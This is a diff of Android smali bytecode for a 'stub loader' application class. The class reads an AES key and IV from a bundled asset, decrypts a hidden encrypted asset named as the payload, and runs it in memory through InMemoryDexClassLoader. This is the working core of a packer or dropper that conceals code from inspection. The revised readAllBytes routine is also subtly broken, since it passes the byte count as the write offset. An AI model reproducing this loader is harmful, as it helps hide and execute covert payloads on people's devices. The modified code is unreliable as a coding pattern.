@@ -21,13 +21,13 @@
 .end method
 
 .method private loadPayload(Landroid/content/Context;)V
-    .registers 15
+    .registers 16
 
-    # --- ler k.bin (48 bytes: key[32] + iv[16]) ---
-    const-string v0, "k.bin"
-    invoke-virtual {p1, v0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
-    move-result-object v1
-    invoke-virtual {v1, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    # ler k.bin
+    invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v0
+    const-string v1, "k.bin"
+    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v2
 
     const/16 v3, 0x30
@@ -36,41 +36,39 @@
     invoke-virtual {v2, v4, v5, v3}, Ljava/io/InputStream;->read([BII)I
     invoke-virtual {v2}, Ljava/io/InputStream;->close()V
 
-    # key = k.bin[0..31]
+    # key = bytes[0..31]
     const/4 v5, 0x0
     const/4 v6, 0x20
     invoke-static {v4, v5, v6}, Ljava/util/Arrays;->copyOfRange([BII)[B
     move-result-object v7
 
-    # iv = k.bin[32..47]
+    # iv = bytes[32..47]
     const/4 v5, 0x20
     const/16 v6, 0x30
     invoke-static {v4, v5, v6}, Ljava/util/Arrays;->copyOfRange([BII)[B
     move-result-object v8
 
-    # --- ler p.bin (payload encriptado) ---
-    const-string v0, "p.bin"
+    # ler p.bin
     invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
-    move-result-object v1
-    invoke-virtual {v1, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v0
+    const-string v1, "p.bin"
+    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v9
 
     invoke-static {v9}, Lcom/stub/loader/StubApplication;->readAllBytes(Ljava/io/InputStream;)[B
     move-result-object v10
     invoke-virtual {v9}, Ljava/io/InputStream;->close()V
 
-    # --- AES/CBC decrypt ---
-    const-string v0, "AES"
-    invoke-static {v0}, Ljavax/crypto/spec/SecretKeySpec;->new(Ljava/lang/String;)V
-    # usa SecretKeySpec e IvParameterSpec via reflection pra compatibilidade
-
+    # SecretKeySpec
     new-instance v11, Ljavax/crypto/spec/SecretKeySpec;
     const-string v0, "AES"
     invoke-direct {v11, v7, v0}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
 
+    # IvParameterSpec
     new-instance v12, Ljavax/crypto/spec/IvParameterSpec;
     invoke-direct {v12, v8}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V
 
+    # Cipher
     const-string v0, "AES/CBC/PKCS5Padding"
     invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
     move-result-object v13
@@ -80,7 +78,7 @@
     invoke-virtual {v13, v10}, Ljavax/crypto/Cipher;->doFinal([B)[B
     move-result-object v14
 
-    # --- InMemoryDexClassLoader (API 26+) ---
+    # ByteBuffer + InMemoryDexClassLoader
     invoke-static {v14}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
     move-result-object v0
 
@@ -94,16 +92,17 @@
 .end method
 
 .method private static readAllBytes(Ljava/io/InputStream;)[B
-    .registers 6
+    .registers 5
     new-instance v0, Ljava/io/ByteArrayOutputStream;
     invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V
     const/16 v1, 0x1000
     new-array v2, v1, [B
     :loop
-    invoke-virtual {p0, v2, 0x0, v1}, Ljava/io/InputStream;->read([BII)I
+    const/4 v3, 0x0
+    invoke-virtual {p0, v2, v3, v1}, Ljava/io/InputStream;->read([BII)I
     move-result v3
     if-ltz v3, :done
-    invoke-virtual {v0, v2, 0x0, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V
+    invoke-virtual {v0, v2, v3, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V
     goto :loop
     :done
     invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
